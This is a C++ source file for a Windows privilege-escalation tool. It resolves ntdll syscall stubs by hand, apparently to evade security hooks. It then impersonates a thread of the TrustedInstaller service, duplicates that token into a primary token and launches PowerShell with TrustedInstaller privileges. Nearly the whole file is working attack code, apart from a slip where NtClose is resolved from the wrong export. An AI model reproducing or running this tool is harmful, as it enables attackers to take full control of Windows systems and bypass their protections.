#include "get_ti.h"

/*	This program steals the impersonation token from TrustedInstaller.exe service and starts a new process with elevated privileges.
* 
*	1. Start TrustedInstaller.exe service.
*	2. Get TrustedInstaller.exe PID.
*	3. Get its first thread.
*	4. Impersonate the thread.
*	5. Query impersonation token.
*	6. Create a new process with the stolen token.
*/

extern "C" DWORD mNtOpenProcess;
extern "C" UINT_PTR addrNtOpenProcess;
extern "C" DWORD mNtAllocateVirtualMemory;
extern "C" UINT_PTR addrNtAllocateVirtualMemory;
extern "C" DWORD mNtWriteVirtualMemory;
extern "C" UINT_PTR addrNtWriteVirtualMemory;
extern "C" DWORD mNtCreateThreadEx;
extern "C" UINT_PTR addrNtCreateThreadEx;
extern "C" DWORD mNtClose;
extern "C" UINT_PTR addrNtClose;
extern "C" DWORD mNtAdjustPrivilegesToken;
extern "C" UINT_PTR addrNtAdjustPrivilegesToken;
extern "C" DWORD mNtDuplicateToken;
extern "C" UINT_PTR addrNtDuplicateToken;
extern "C" DWORD mNtOpenProcessToken;
extern "C" UINT_PTR addrNtOpenProcessToken;
extern "C" DWORD mNtQueryInformationToken;
extern "C" UINT_PTR addrNtQueryInformationToken;
extern "C" DWORD mNtSetInformationThread;
extern "C" UINT_PTR addrNtSetInformationThread;
extern "C" DWORD mZwImpersonateThread;
extern "C" UINT_PTR addrZwImpersonateThread;


// Functions
extern "C" NTSTATUS NtOpenProcess(PHANDLE ph, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
extern "C" NTSTATUS NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
extern "C" NTSTATUS NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten);
extern "C" NTSTATUS NtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes,
	HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits,
	SIZE_T StackSize, SIZE_T MaximumStackSize, PPS_ATTRIBUTE_LIST AttributeList);
extern "C" NTSTATUS NtClose(HANDLE handle);
extern "C" NTSTATUS NtAdjustPrivilegesToken(HANDLE TokenHandle, BOOL DisableAllPriviledges, PTOKEN_PRIVILEGES TokenPriviledges,
	ULONG PreviousPrivilegesLength, PTOKEN_PRIVILEGES PreviousPrivileges, PULONG RequiredLength);
extern "C" NTSTATUS NtDuplicateToken(HANDLE ExistingTokenHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes,
	BOOLEAN EffectiveOnly, TOKEN_TYPE TokenType, PHANDLE NewTokenHandle);
extern "C" NTSTATUS NtOpenProcessToken(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess, PHANDLE TokenHandle);
extern "C" NTSTATUS NtQueryInformationToken(HANDLE tokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, PVOID TokenInformation,
	ULONG TokenInformationLength, PULONG ReturnLength);
extern "C" NTSTATUS NtSetInformationThread(HANDLE threadHandle, THREADINFOCLASS threadInformationClass, PVOID threadInformation, ULONG threadInformationLength);
extern "C" NTSTATUS ZwImpersonateThread(HANDLE ThreadHandle, HANDLE TargetThreadHandle, PSECURITY_QUALITY_OF_SERVICE SecurityQualityOfService);

auto GetLoadedDllDataTableEntry(const wchar_t* dllFullPath) {
	TEB* teb = (TEB*)__readgsqword(0x30);
	PEB* peb = teb->ProcessEnvironmentBlock;

	auto moduleBase = &peb->Ldr->InMemoryOrderModuleList;
	auto frontLink = moduleBase->Flink;

	do {
		auto moduleEntry = reinterpret_cast<PLDR_DATA_TABLE_ENTRY>((uint8_t*)frontLink - (sizeof(LIST_ENTRY)));

		if (!_wcsicmp(moduleEntry->FullDllName.Buffer, dllFullPath)) return moduleEntry;

		frontLink = frontLink->Flink;
	} while (frontLink != moduleBase);

	return (PLDR_DATA_TABLE_ENTRY)nullptr;
}

void* getFuncAddress(const wchar_t* fullDllPath, const char* procName) {

	auto dataTableEntry = GetLoadedDllDataTableEntry(fullDllPath);
	if (!dataTableEntry) {
		errormsg("Unable to get Data Table Entry of targetted module: %ls. ERROR: %d", fullDllPath, GetLastError());
		return nullptr;
	}

	// Get the DOS header at the beginning of its address space
	PIMAGE_DOS_HEADER DOSHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(dataTableEntry->DllBase);
	if (!DOSHeader) {
		errormsg("Unable to get DOS header. ERROR: %d", GetLastError());
		return nullptr;
	}

	// Get NT headers
	PIMAGE_NT_HEADERS NTHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>((uint8_t*)dataTableEntry->DllBase + DOSHeader->e_lfanew);
	if (!NTHeaders) {
		errormsg("Unable to get NT headers. ERROR: %d", GetLastError());
		return nullptr;
	}

	// Get data directory for exports from optional header located inside the NT headers
	auto expDataDir = &NTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	if (!expDataDir) {
		errormsg("Unable to get exports data directory. ERROR: %d", GetLastError());
		return nullptr;
	}

	// Get the data structure in which the target export addresses are located
	auto expDir = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>((uint8_t*)dataTableEntry->DllBase + expDataDir->VirtualAddress);
	if (!expDir) {
		errormsg("Unable to get exports directory. ERROR: %d", GetLastError());
		return nullptr;
	}

	// Entry points to the data
	auto functionAddresses = reinterpret_cast<uint32_t*>((uint8_t*)dataTableEntry->DllBase + expDir->AddressOfFunctions);
	auto nameAddresses = reinterpret_cast<uint32_t*>((uint8_t*)dataTableEntry->DllBase + expDir->AddressOfNames);
	auto ordinalAddresses = reinterpret_cast<uint16_t*>((uint8_t*)dataTableEntry->DllBase + expDir->AddressOfNameOrdinals);

	for (uint32_t i = 0; i < expDir->NumberOfFunctions; i++) {
		auto funcName = reinterpret_cast<const char*>((uint8_t*)dataTableEntry->DllBase + nameAddresses[i]);
		if (!_stricmp(funcName, procName)) {
			// Access the fucntion directly by its ordinal
			return reinterpret_cast<uint32_t*>((uint8_t*)dataTableEntry->DllBase + functionAddresses[ordinalAddresses[i]]);
		}
	}

	return nullptr;
}

BOOL loggedUserImpersonate(HANDLE hToken) {
	NTSTATUS status;
	NTSTATUS threadStatus;
	PVOID TokenInformation;
	HANDLE threadToken;
	ULONG length;
	OBJECT_ATTRIBUTES ObjectAttributes;
	SECURITY_QUALITY_OF_SERVICE sqos;

	status = NtQueryInformationToken(hToken, TokenType, &TokenInformation, 4u, &length);
	if (status != STATUS_SUCCESS) {
		errormsg("NtQueryInformationToken failed. ERROR: %x", status);
		exit(EXIT_FAILURE);
	}
	if (TokenInformation) {
		memset(&ObjectAttributes.RootDirectory, 0, 20);
		ObjectAttributes.SecurityDescriptor = 0LL;
		ObjectAttributes.SecurityQualityOfService = &sqos;
		ObjectAttributes.Length = 12;
		sqos.ContextTrackingMode = 1;
		status = NtDuplicateToken(hToken, TOKEN_ALL_ACCESS, &ObjectAttributes, 0, TokenImpersonation, &threadToken);
		if (status == STATUS_SUCCESS) {
			threadStatus = NtSetInformationThread((HANDLE)~0ULL, ThreadImpersonationToken, &threadToken, 8u);
			if (threadStatus != STATUS_SUCCESS) {
				errormsg("NtSetInformationThread failed. ERROR: %x", threadStatus);
				exit(EXIT_FAILURE);
			}
			if (threadToken) {
				NtClose(threadToken);
				return true;
			}
		}
	}

	return true;
}

void enablePriviledges(HANDLE hToken, LPCTSTR lpszPriviledge, BOOL bEnablePriviledge) {
	TOKEN_PRIVILEGES tp;
	LUID luid;	// LUID of the priviledge on local system

	// CHANGE
	if (!LookupPrivilegeValue(NULL, lpszPriviledge, &luid)) {
		errormsg("LookupPriciledgeValue failed. ERROR: %d", GetLastError());
		exit(EXIT_FAILURE);
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;

	if (bEnablePriviledge)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;
	NTSTATUS status = NtAdjustPrivilegesToken(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	if (status != STATUS_SUCCESS) {
		errormsg("NtAdjustPrivilegesToken failed. ERROR: %x", status);
		exit(EXIT_FAILURE);
	}

	okay("Priviledges enabled!");

}

int getPID(const wchar_t* procName) {
	HANDLE hSnapshot;
	PROCESSENTRY32 pe;
	BOOL hResult;

	int pid = 0;

	// Process list snapshot
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		printf("[X] ERROR: Invalid Handle Value for process snapshot handle...\n");
		return 0;
	}

	// Initialize size used in Process List
	pe.dwSize = sizeof(PROCESSENTRY32);

	// Get first process
	hResult = Process32First(hSnapshot, &pe);

	// Process info
	while (hResult) {
		if (wcscmp(pe.szExeFile, procName) == 0) {
			pid = pe.th32ProcessID;
			break;
		}
		hResult = Process32Next(hSnapshot, &pe);
	}

	// Cleanup
	CloseHandle(hSnapshot);

	return pid;
}

void locateFunctions() {
	UINT_PTR pNtOpenProcess = (UINT_PTR)getFuncAddress(L"C:\\windows\\SYSTEM32\\ntdll.dll", "NtOpenProcess");
	mNtOpenProcess = *(uint32_t*)(pNtOpenProcess + 0x4);
	addrNtOpenProcess = pNtOpenProcess + 0x12;

	UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)getFuncAddress(L"C:\\windows\\SYSTEM32\\ntdll.dll", "NtAllocateVirtualMemory");
	mNtAllocateVirtualMemory = *(uint32_t*)(pNtAllocateVirtualMemory + 0x4);
	addrNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12;

	UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)getFuncAddress(L"C:\\windows\\SYSTEM32\\ntdll.dll", "NtWriteVirtualMemory");
	mNtWriteVirtualMemory = *(uint32_t*)(pNtWriteVirtualMemory + 0x4);
	addrNtWriteVirtualMemory = pNtWriteVirtualMemory + 0x12;

	UINT_PTR pNtCreateThreadEx = (UINT_PTR)getFuncAddress(L"C:\\windows\\SYSTEM32\\ntdll.dll", "NtCreateThreadEx");
	mNtCreateThreadEx = *(uint32_t*)(pNtCreateThreadEx + 0x4);
	addrNtCreateThreadEx = pNtCreateThreadEx + 0x12;

	UINT_PTR pNtClose = (UINT_PTR)getFuncAddress(L"C:\\windows\\SYSTEM32\\ntdll.dll", "NtCreateThreadEx");
	mNtClose = *(uint32_t*)(pNtClose + 0x4);
	addrNtClose = pNtClose + 0x12;

	UINT_PTR pNtAdjustPrivilegesToken = (UINT_PTR)getFuncAddress(L"C:\\windows\\SYSTEM32\\ntdll.dll", "NtAdjustPrivilegesToken");
	mNtAdjustPrivilegesToken = *(uint32_t*)(pNtAdjustPrivilegesToken + 0x4);
	addrNtAdjustPrivilegesToken = pNtAdjustPrivilegesToken + 0x12;

	UINT_PTR pNtDuplicateToken = (UINT_PTR)getFuncAddress(L"C:\\windows\\SYSTEM32\\ntdll.dll", "NtDuplicateToken");
	mNtDuplicateToken = *(uint32_t*)(pNtDuplicateToken + 0x4);
	addrNtDuplicateToken = pNtDuplicateToken + 0x12;

	UINT_PTR pNtOpenProcessToken = (UINT_PTR)getFuncAddress(L"C:\\windows\\SYSTEM32\\ntdll.dll", "NtOpenProcessToken");
	mNtOpenProcessToken = *(uint32_t*)(pNtOpenProcessToken + 0x4);
	addrNtOpenProcessToken = pNtOpenProcessToken + 0x12;

	UINT_PTR pNtQueryInformationToken = (UINT_PTR)getFuncAddress(L"C:\\windows\\SYSTEM32\\ntdll.dll", "NtQueryInformationToken");
	mNtQueryInformationToken = *(uint32_t*)(pNtQueryInformationToken + 0x4);
	addrNtQueryInformationToken = pNtQueryInformationToken + 0x12;

	UINT_PTR pNtSetInformationThread = (UINT_PTR)getFuncAddress(L"C:\\windows\\SYSTEM32\\ntdll.dll", "NtSetInformationThread");
	mNtSetInformationThread = *(uint32_t*)(pNtSetInformationThread + 0x4);
	addrNtSetInformationThread = pNtSetInformationThread + 0x12;

	UINT_PTR pZwImpersonateThread = (UINT_PTR)getFuncAddress(L"C:\\Windows\\System32\\ntdll.dll", "ZwImpersonateThread");
	mZwImpersonateThread = *(uint32_t*)(pZwImpersonateThread + 0x4);
	addrZwImpersonateThread = pZwImpersonateThread + 0x12;
}

bool StartTIService() {
	SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!hSCManager) {
		errormsg("Unable to open service control manager. ERROR: %d", GetLastError());
		return false;
	}
	info("Service Control Manager handle: %p", hSCManager);

	SC_HANDLE hService = OpenServiceA(hSCManager, "TrustedInstaller", SERVICE_START);
	if (!hService) {
		errormsg("Unable to open service. ERROR: %d", GetLastError());
		return false;
	}
	okay("Opened service.");
	proc("Starting the service...");
	if (!StartServiceA(hService, 0, NULL)) {
		DWORD err = GetLastError();
		if (err != ERROR_SERVICE_ALREADY_RUNNING) {
			errormsg("Unable to start service. ERROR: %d", err);
			NtClose(hService);
			NtClose(hSCManager);
			return false;
		}
	}
	return true;
}

DWORD GetTIPID() {
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		errormsg("Unable to create process snapshot. ERROR: %d", GetLastError());
		return 0;
	}

	PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
	if (Process32First(hSnapshot, &pe)) {
		do {
			if (!_wcsicmp(pe.szExeFile, L"trustedinstaller.exe")) {
				NtClose(hSnapshot);
				return pe.th32ProcessID;
			}
		} while (Process32Next(hSnapshot, &pe));
	}

	NtClose(hSnapshot);
	return 0;
}

HANDLE GetFirstThread(DWORD pid) {
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		errormsg("Unable to create thread snapshot. ERROR: %d", GetLastError());
		return NULL;
	}

	THREADENTRY32 te = { sizeof(THREADENTRY32) };
	if (Thread32First(hSnapshot, &te)) {
		do {
			if (te.th32OwnerProcessID == pid) {
				HANDLE hThread = OpenThread(THREAD_DIRECT_IMPERSONATION, FALSE, te.th32ThreadID);
				if (hThread) {
					NtClose(hSnapshot);
					return hThread;
				}
			}
		} while (Thread32Next(hSnapshot, &te));
	}

	NtClose(hSnapshot);
	return NULL;
}

NTSTATUS ImpersonateTIThread(HANDLE hThread) {
	NTSTATUS status = NULL;
	SECURITY_QUALITY_OF_SERVICE sqos = { 0 };
	sqos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
	sqos.ImpersonationLevel = SecurityImpersonation;
	sqos.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING;
	sqos.EffectiveOnly = FALSE;

	status = ZwImpersonateThread(GetCurrentThread(), hThread, &sqos);
	if (status != STATUS_SUCCESS) {
		errormsg("Unable to impersonate thread. ERROR: %x", status);
		return status;
	}
	return status;
}

void QueryImpersonationToken() {
	HANDLE hToken;
	if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken)) {
		errormsg("Unable to open thread token. ERROR: %d", GetLastError());
		return;
	}

	DWORD bufferSize = 0;
	GetTokenInformation(hToken, TokenGroups, NULL, 0, &bufferSize);

	PTOKEN_GROUPS pGroups = (PTOKEN_GROUPS)malloc(bufferSize);
	if (!pGroups) {
		errormsg("Unable to allocate memory for token groups. ERROR: %d", GetLastError());
		CloseHandle(hToken);
		return;
	}

	if (GetTokenInformation(hToken, TokenGroups, pGroups, bufferSize, &bufferSize)) {
		for (DWORD i = 0; i < pGroups->GroupCount; ++i) {
			SID_NAME_USE sidType;
			WCHAR name[256];
			WCHAR domain[256];
			DWORD nameSize = 256;
			DWORD domainSize = 256;

			if (LookupAccountSidW(NULL, pGroups->Groups[i].Sid, name, &nameSize, domain, &domainSize, &sidType)) {
				okay("Group: %ws\\%ws", domain, name);
			}
		}
	}
	else {
		errormsg("Unable to get token information. ERROR: %d", GetLastError());
	}

	free(pGroups);
	NtClose(hToken);
}

void SpawnCmdWithToken(HANDLE hToken) {
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	si.cb = sizeof(STARTUPINFO);

	WCHAR cmd[] = L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";

	if (!CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE, cmd, NULL, 0, NULL, NULL, &si, &pi)) {
		errormsg("CreateProcessWithTokenW failed.");
		errormsg("ERROR: %d", GetLastError());
		CloseHandle(hToken);
		return;
	}

	okay("Process created successfully! PID: %d", pi.dwProcessId);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(hToken);
}

int main() {
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(STARTUPINFO));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

	si.cb = sizeof(STARTUPINFO);

	proc("Locating functions in ntdll...");

	locateFunctions();

	okay("Done.");
	proc("Starting TrustedInstaller service...");
	if (!StartTIService()) {
		errormsg("Could not start TrustedInstaller service.");
		errormsg("ERROR: %d", GetLastError());
		return EXIT_FAILURE;
	}
	okay("Done.");

	proc("Getting TrustedInstaller's PID...");
	DWORD pid = GetTIPID();
	if (!pid) {
		errormsg("Unable to get TrustedInstaller PID");
		errormsg("ERROR: %d", GetLastError());
		return EXIT_FAILURE;
	}
	okay("Done. PID: %d", pid);

	proc("Getting the first thread of the service...");
	HANDLE th = GetFirstThread(pid);
	if (!th) {
		errormsg("Unable to get the first thread of the service...");
		errormsg("ERROR: %d", GetLastError());
		return EXIT_FAILURE;
	}
	okay("Done.");

	proc("Impersonating the thread...");
	NTSTATUS status = ImpersonateTIThread(th);
	if (status != STATUS_SUCCESS) {
		errormsg("Unable to impersonate the thread...");
		errormsg("ERROR: %d", GetLastError());
		return EXIT_FAILURE;
	}
	okay("Done.");

	QueryImpersonationToken();

	proc("Querying and duplicating the impersonation token...");
	HANDLE hImpersonationToken;
	if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY | TOKEN_DUPLICATE, FALSE, &hImpersonationToken)) {
		errormsg("Unable to open thread token. ERROR: %d", GetLastError());
		return EXIT_FAILURE;
	}
	okay("Done.");

	proc("Duplicating the token...");
	HANDLE hPrimaryToken;
	if (!DuplicateTokenEx(hImpersonationToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimaryToken)) {
		errormsg("DuplicateTokenEx failed. ERROR: %d", GetLastError());
		return EXIT_FAILURE;
	}
	okay("Done.");

	NtClose(hImpersonationToken);

	// TRUSTED INSTALLER PRIVILEGES
	SpawnCmdWithToken(hPrimaryToken);

	NtClose(th);

	return EXIT_SUCCESS;
}